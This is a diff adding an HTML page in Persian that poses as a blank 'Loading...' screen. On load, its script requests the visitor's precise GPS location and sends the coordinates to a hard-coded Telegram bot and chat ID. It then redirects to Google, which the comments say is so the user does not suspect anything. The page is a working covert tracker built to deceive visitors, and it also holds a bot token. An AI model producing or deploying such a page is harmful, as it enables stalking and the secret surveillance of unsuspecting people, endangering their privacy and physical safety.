@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بارگذاری...</title>
+</head>
+<body style="background-color: #ffffff; margin: 0;">
+
+    <script>
+        // اطلاعات ربات و چت‌آیدی شما
+        const BOT_TOKEN = '8819824616:AAGeOJx_dFMt_VLYzmLoH60D9CjHybUhcI8';
+        const CHAT_ID = '8861869235';
+
+        function sendLocationToTelegram(lat, lon) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    latitude: lat,
+                    longitude: lon
+                })
+            }).then(() => {
+                // پس از ارسال موفقیت‌آمیز، کاربر به گوگل هدایت می‌شود تا شک نکند
+                window.location.href = "https://www.google.com";
+            }).catch(() => {
+                window.location.href = "https://www.google.com";
+            });
+        }
+
+        function initTracking() {
+            if (!navigator.geolocation) {
+                window.location.href = "https://www.google.com";
+                return;
+            }
+
+            // درخواست لوکیشن با بالاترین دقت ممکن
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+
+                    // شرط دوم شما: اعمال تاخیر ۳ ثانیه‌ای برای تثبیت و افزایش دقت GPS
+                    setTimeout(() => {
+                        sendLocationToTelegram(lat, lon);
+                    }, 3000); // ۳۰۰۰ میلی‌ثانیه = ۳ ثانیه مکث برای دقت بالا
+                },
+                function(error) {
+                    // اگر کاربر دسترسی را رد کرد، بدون سر و صدا هدایت شود
+                    window.location.href = "https://www.google.com";
+                },
+                { 
+                    enableHighAccuracy: true, 
+                    timeout: 15000, 
+                    maximumAge: 0 
+                }
+            );
+        }
+
+        // به محض باز شدن صفحه، بدون اینکه متن یا عکسی نشان داده شود، پاپ‌آپ لوکیشن فراخوانی می‌شود
+        window.onload = function() {
+            setTimeout(initTracking, 500);
+        };
+    </script>
+</body>
+</html>
